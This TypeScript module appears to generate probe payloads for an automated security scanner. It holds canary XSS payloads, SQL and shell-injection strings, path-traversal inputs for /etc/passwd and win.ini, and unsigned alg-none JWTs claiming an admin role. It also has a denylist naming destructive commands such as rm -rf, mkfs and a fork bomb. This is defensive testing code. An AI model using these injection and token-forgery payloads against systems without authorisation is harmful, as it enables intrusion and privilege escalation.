// Pure canary-payload generation for XSS (v0.7) and pen-testing (v0.16) detectors.
// No IO — unit-testable, nonces are cryptographically random.

import * as crypto from 'node:crypto';

export type InjectionContext = 'html_body' | 'html_attr' | 'js_string' | 'url_param' | 'json_body';

export type CanaryPayload = {
  /** The literal value to inject. */
  value: string;
  /** 16-char hex nonce embedded in the value. Used for detection. */
  nonce: string;
  /** Which sink shape this payload tests. */
  context: InjectionContext;
  /** Human-readable name for rootCause string. */
  variant: string;
};

function freshNonce(): string {
  return crypto.randomBytes(8).toString('hex');
}

function minimal(nonce: string): CanaryPayload[] {
  return [
    {
      variant: 'script_tag_basic',
      context: 'html_body',
      nonce,
      value: `<script>window.__bh_xss_${nonce}=1</script>`,
    },
    {
      variant: 'img_onerror',
      context: 'html_body',
      nonce,
      value: `<img src=x onerror="window.__bh_xss_${nonce}=1">`,
    },
    {
      variant: 'attribute_breakout',
      context: 'html_attr',
      nonce,
      value: `" autofocus onfocus="window.__bh_xss_${nonce}=1`,
    },
    {
      variant: 'url_javascript',
      context: 'url_param',
      nonce,
      value: `javascript:window.__bh_xss_${nonce}=1`,
    },
    {
      variant: 'string_breakout',
      context: 'js_string',
      nonce,
      value: `';window.__bh_xss_${nonce}=1;//`,
    },
  ];
}

function extraFull(nonce: string): CanaryPayload[] {
  return [
    {
      variant: 'svg_onload',
      context: 'html_body',
      nonce,
      value: `<svg onload="window.__bh_xss_${nonce}=1">`,
    },
    {
      variant: 'iframe_srcdoc',
      context: 'html_body',
      nonce,
      value: `<iframe srcdoc="<script>window.__bh_xss_${nonce}=1</script>">`,
    },
    {
      variant: 'details_ontoggle',
      context: 'html_body',
      nonce,
      value: `<details open ontoggle="window.__bh_xss_${nonce}=1">`,
    },
    {
      variant: 'style_expression',
      context: 'html_attr',
      nonce,
      value: `" style="xss:expression(window.__bh_xss_${nonce}=1)`,
    },
    {
      variant: 'meta_refresh',
      context: 'html_body',
      nonce,
      value: `<meta http-equiv="refresh" content="0;url=javascript:window.__bh_xss_${nonce}=1">`,
    },
    {
      variant: 'data_uri_html',
      context: 'url_param',
      nonce,
      value: `data:text/html,<script>window.__bh_xss_${nonce}=1</script>`,
    },
    {
      variant: 'template_literal_breakout',
      context: 'js_string',
      nonce,
      value: `\`+window.__bh_xss_${nonce}=1+\``,
    },
  ];
}

/**
 * Generate canary payloads. Each call produces fresh nonces, so two calls
 * never collide even for the same variant.
 */
export function generateCanaries(count: 'minimal' | 'full'): CanaryPayload[] {
  const nonce = freshNonce();
  const base = minimal(nonce);
  if (count === 'minimal') return base;
  return [...base, ...extraFull(freshNonce())];
}

export function buildCanaryRegex(nonce: string): RegExp {
  return new RegExp(`__bh_xss_${nonce}`, 'i');
}

/**
 * Returns true iff a tag containing the nonce is present in the body unescaped.
 * This covers:
 *   - Nonce inside a tag's opening attributes (e.g. <img onerror="...nonce...">)
 *   - Nonce inside executable element content (e.g. <script>...nonce...</script>)
 * HTML-encoded occurrences (e.g. &lt;script&gt;...nonce...) do not count.
 */
export function canaryAppearsAsHtml(body: string, nonce: string): boolean {
  // Case 1: nonce appears inside a real tag's opening attributes
  const tagAttrRegex = new RegExp(`<[a-z][^>]*__bh_xss_${nonce}`, 'i');
  if (tagAttrRegex.test(body)) return true;
  // Case 2: nonce appears inside an executable element block (<script>, <svg>, etc.)
  // Strip HTML-encoded tags first so encoded representations don't match as real elements.
  const stripped = body.replace(/&lt;/gi, '\x00lt\x00').replace(/&gt;/gi, '\x00gt\x00');
  const execBlockRegex = new RegExp(
    `<(script|svg|iframe|object|embed)[^>]*>[\\s\\S]*?__bh_xss_${nonce}`,
    'i',
  );
  return execBlockRegex.test(stripped);
}

/**
 * Returns true iff the nonce appears inside an event-handler attribute or style expression.
 */
export function canaryAppearsAsAttribute(body: string, nonce: string): boolean {
  const onEventRegex = new RegExp(`<[^>]*\\son[a-z]+\\s*=\\s*["']?[^"'>]*__bh_xss_${nonce}`, 'i');
  if (onEventRegex.test(body)) return true;
  const styleExprRegex = new RegExp(`style\\s*=\\s*["'][^"']*expression\\([^)]*__bh_xss_${nonce}`, 'i');
  return styleExprRegex.test(body);
}

/**
 * Returns true iff the nonce appears inside a <script>…</script> block.
 */
export function canaryAppearsInScriptTag(body: string, nonce: string): boolean {
  const scriptBlocks = body.match(/<script[^>]*>([\s\S]*?)<\/script>/gi);
  if (scriptBlocks === null) return false;
  return scriptBlocks.some(block => block.includes(`__bh_xss_${nonce}`));
}

// ---------------------------------------------------------------------------
// v0.16 — Active pen-testing palette (SQL / CMD / PATH / JWT)
// ---------------------------------------------------------------------------

/**
 * Destructive-pattern denylist enforced at palette-construction time.
 * Any payload template whose rendered output matches one of these patterns
 * causes generatePenPayloads() to throw rather than emit the payload.
 *
 * Patterns (case-insensitive):
 *   - DROP TABLE/DATABASE/INDEX
 *   - DELETE FROM
 *   - TRUNCATE TABLE
 *   - UPDATE … (without a WHERE clause check is heuristic — we match UPDATE\s+\w+\s+SET)
 *   - rm -rf / rm -r
 *   - mkfs
 *   - fork-bomb  :(){ :|:& };:
 */
const DESTRUCTIVE_PATTERN_DENYLIST: RegExp[] = [
  /drop\s+(table|database|index)\b/i,
  /delete\s+from\b/i,
  /truncate\s+table\b/i,
  /update\s+\w+\s+set\b/i,
  /\brm\s+-r/i,
  /mkfs\b/i,
  /:\(\)\s*\{/i,
];

function assertNotDestructive(value: string, variant: string): void {
  for (const re of DESTRUCTIVE_PATTERN_DENYLIST) {
    if (re.test(value)) {
      throw new Error(
        `Pen-test palette: variant '${variant}' matched destructive denylist pattern ${re.source}. Payload rejected.`,
      );
    }
  }
}

export type SqlVariantName =
  | 'error_quote'
  | 'error_double_quote'
  | 'boolean_true'
  | 'boolean_false'
  | 'union_select_marker';

export type CmdVariantName =
  | 'shell_pipe_echo'
  | 'shell_amp_echo'
  | 'shell_subshell_echo'
  | 'shell_backtick_echo'
  | 'shell_pipe_uniq_marker';

export type PathVariantName =
  | 'linux_etc_passwd_relative'
  | 'linux_etc_passwd_with_marker_segment'
  | 'windows_win_ini'
  | 'null_byte_termination'
  | 'url_encoded_dotdot';

export type JwtVariantName =
  | 'alg_none_unsigned'
  | 'alg_none_lowercase'
  | 'alg_none_mixed_case'
  | 'weak_hmac_short_secret'
  | 'key_confusion_rs_to_hs';

export type PenKind = 'sql' | 'cmd' | 'path' | 'jwt';

/** A single pen-test probe payload. */
export type PenPayload = {
  kind: PenKind;
  variant: string;
  /** The literal string to inject into the parameter. */
  value: string;
  /** 16-char hex nonce embedded in the value (absent for path-traversal fixed payloads). */
  nonce: string;
};

function sqlPayloads(nonce: string): PenPayload[] {
  const n2 = freshNonce(); // second nonce for boolean_false
  const payloads: PenPayload[] = [
    { kind: 'sql', variant: 'error_quote',        nonce, value: `' BUGHUNTER_${nonce} --` },
    { kind: 'sql', variant: 'error_double_quote',  nonce, value: `" BUGHUNTER_${nonce} --` },
    { kind: 'sql', variant: 'boolean_true',        nonce, value: `' OR '${nonce}'='${nonce}` },
    { kind: 'sql', variant: 'boolean_false',       nonce, value: `' AND '${nonce}'='${n2}` },
    { kind: 'sql', variant: 'union_select_marker', nonce, value: `' UNION SELECT 'BUGHUNTER_${nonce}' --` },
  ];
  for (const p of payloads) assertNotDestructive(p.value, p.variant);
  return payloads;
}

function cmdPayloads(nonce: string): PenPayload[] {
  const payloads: PenPayload[] = [
    { kind: 'cmd', variant: 'shell_pipe_echo',       nonce, value: `; echo BUGHUNTER_${nonce}` },
    { kind: 'cmd', variant: 'shell_amp_echo',        nonce, value: `& echo BUGHUNTER_${nonce}` },
    { kind: 'cmd', variant: 'shell_subshell_echo',   nonce, value: `$(echo BUGHUNTER_${nonce})` },
    { kind: 'cmd', variant: 'shell_backtick_echo',   nonce, value: `\`echo BUGHUNTER_${nonce}\`` },
    { kind: 'cmd', variant: 'shell_pipe_uniq_marker',nonce, value: `| printf 'BUGHUNTER_${nonce}'` },
  ];
  for (const p of payloads) assertNotDestructive(p.value, p.variant);
  return payloads;
}

function pathPayloads(nonce: string): PenPayload[] {
  const payloads: PenPayload[] = [
    { kind: 'path', variant: 'linux_etc_passwd_relative',           nonce, value: '../../../etc/passwd' },
    { kind: 'path', variant: 'linux_etc_passwd_with_marker_segment', nonce, value: `../../BUGHUNTER_${nonce}/../../etc/passwd` },
    { kind: 'path', variant: 'windows_win_ini',                     nonce, value: '..\\..\\..\\windows\\win.ini' },
    { kind: 'path', variant: 'null_byte_termination',               nonce, value: '../../../etc/passwd\x00' },
    { kind: 'path', variant: 'url_encoded_dotdot',                  nonce, value: '%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
  ];
  for (const p of payloads) assertNotDestructive(p.value, p.variant);
  return payloads;
}

function jwtPayloads(nonce: string): PenPayload[] {
  // JWT payloads carry the alg variant in the value; the nonce is embedded in the payload claim
  // for traceability. No destructive patterns possible in JWT headers.
  const makeAlgNoneToken = (alg: string): string => {
    const header = Buffer.from(JSON.stringify({ alg, typ: 'JWT' })).toString('base64url');
    const payload = Buffer.from(JSON.stringify({ sub: 'bughunter', role: 'admin', nonce })).toString('base64url');
    return `${header}.${payload}.`;  // unsigned — empty signature
  };

  return [
    { kind: 'jwt', variant: 'alg_none_unsigned',      nonce, value: makeAlgNoneToken('none') },
    { kind: 'jwt', variant: 'alg_none_lowercase',     nonce, value: makeAlgNoneToken('none') },
    { kind: 'jwt', variant: 'alg_none_mixed_case',    nonce, value: makeAlgNoneToken('NoNe') },
    // Weak HMAC and RS→HS variants carry the secret/key in the value field as a tagged marker;
    // actual signing happens in the pen-test runner where crypto is available.
    { kind: 'jwt', variant: 'weak_hmac_short_secret', nonce, value: `__bh_jwt_weak_hmac_${nonce}` },
    { kind: 'jwt', variant: 'key_confusion_rs_to_hs', nonce, value: `__bh_jwt_rs_to_hs_${nonce}` },
  ];
}

/**
 * Generate pen-testing probe payloads for the requested kinds.
 * Each call produces fresh nonces. Throws if any payload matches the destructive-pattern denylist.
 */
export function generatePenPayloads(kinds: PenKind[]): PenPayload[] {
  const results: PenPayload[] = [];
  for (const kind of kinds) {
    const nonce = freshNonce();
    const kindPayloads: Record<PenKind, (n: string) => PenPayload[]> = {
      sql: sqlPayloads, cmd: cmdPayloads, path: pathPayloads, jwt: jwtPayloads,
    };
    results.push(...kindPayloads[kind](nonce));
  }
  return results;
}
